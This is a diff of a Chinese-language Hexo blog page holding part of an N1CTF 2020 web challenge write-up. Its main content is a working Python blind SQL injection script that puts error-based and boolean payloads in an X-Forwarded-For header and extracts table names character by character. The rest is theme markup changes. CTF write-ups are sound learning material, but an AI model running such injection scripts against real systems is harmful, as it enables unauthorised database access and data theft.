class="string">f&quot;ascii(substr((<span class="subst">&#123;s&#125;</span>), <span class="subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 使用 char 进行字符判断。</span></span><br><span class="line">        <span class="comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span></span><br><span class="line">        result = query(param)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            f = <span class="literal">True</span></span><br><span class="line">            find += chr(c)</span><br><span class="line">            print(find)</span><br><span class="line">            print(<span class="string">&#x27;-------------------------&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(find)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-comment"># 生成库名表名字符所在的字符列表字典</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ascii_str</span>():</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可显示字符</span><br>        str_list.append(chr(i))<br>    <span class="hljs-comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span><br>    <span class="hljs-comment"># # 返回字符列表</span><br>    <span class="hljs-keyword">return</span> str_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">sql</span>):</span><br>    payload = <span class="hljs-string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="hljs-string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span><br>    print(payload)<br>    resp = session.get(<br>        url=url,<br>        headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>: payload&#125;<br>    )<br>    soup = BeautifulSoup(markup=resp.text, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取判读 True 和 False 的依据</span><br>    result = soup.find_all(name=<span class="hljs-string">&#x27;code&#x27;</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(result)</span><br><br>    <span class="hljs-comment"># 执行成功返回 True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1ctf2020&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># 用于测试函数是否正常执行（使用 while 不方便）</span><br><span class="hljs-comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span><br><span class="hljs-comment"># result = query(param)</span><br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-comment"># 不同的字典</span><br>CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHAR_DICTIONARY2 = ascii_str()<br><br><span class="hljs-comment"># find 用于存储已找到的字符</span><br>find = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 使用 ascii 作用判断依据更好。</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    f = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>, <span class="hljs-number">127</span>):<br>        pos = len(find) + <span class="hljs-number">1</span><br>        s = <span class="hljs-string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span><br>        <span class="hljs-comment"># 使用 ascii 码进行判断（更优）</span><br>        param = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;s&#125;</span>), <span class="hljs-subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="hljs-subst">&#123;c&#125;</span>&#x27;&quot;</span><br>        <span class="hljs-comment"># 使用 char 进行字符判断。</span><br>        <span class="hljs-comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span><br>        result = query(param)<br>        <span class="hljs-keyword">if</span> result:<br>            f = <span class="hljs-literal">True</span><br>            find += chr(c)<br>            print(find)<br>            print(<span class="hljs-string">&#x27;-------------------------&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f:<br>        <span class="hljs-keyword">break</span><br>print(find)<br><br></code></pre></td></tr></table></figure>
 
 <p>参考教程：</p>
 <ol>
@@ -270,173 +280,134 @@
 <hr>
 <p>后面的题目以后有时间补补（占坑</p>
 
-    </div>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2020年10月ByteCTF部分web题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+                        <span class="hidden-mobile">2020年10月西湖论剑CTF部分web题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    
-    
-    
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" rel="prev" title="2020年10月西湖论剑CTF部分web题解">
-      <i class="fa fa-chevron-left"></i> 2020年10月西湖论剑CTF部分web题解
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/10/25/20201025-ByteCTF%E9%A2%98%E8%A7%A3/" rel="next" title="2020年10月ByteCTF部分web题解">
-      2020年10月ByteCTF部分web题解 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
+            
+          </article>
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web-SignIn%EF%BC%88SQL%E7%9B%B2%E6%B3%A8-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Web-SignIn（SQL盲注+报错注入+布尔注入）</span></a></li></ol></div>
       </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">slug01sh</p>
-  <div class="site-description" itemprop="description">欢迎大家发表自己的见解与评价</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives">
-          <span class="site-state-item-count">7</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">6</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
-
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">slug01sh</span>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
-
-        
-
-
-
-
-
-
-
 
       </div>
-    </footer>
+    
   </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/js/utils.js"></script>
+  
+</footer>
 
-<script src="/js/motion.js"></script>
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
 
 
-<script src="/js/next-boot.js"></script>
-
+  
+    <script  src="/js/lazyload.js" ></script>
+  
 
 
 
@@ -444,6 +415,49 @@
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
 
 
 
@@ -456,9 +470,13 @@
 
 
 
-  
 
-  
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
 
 </body>
 </html>
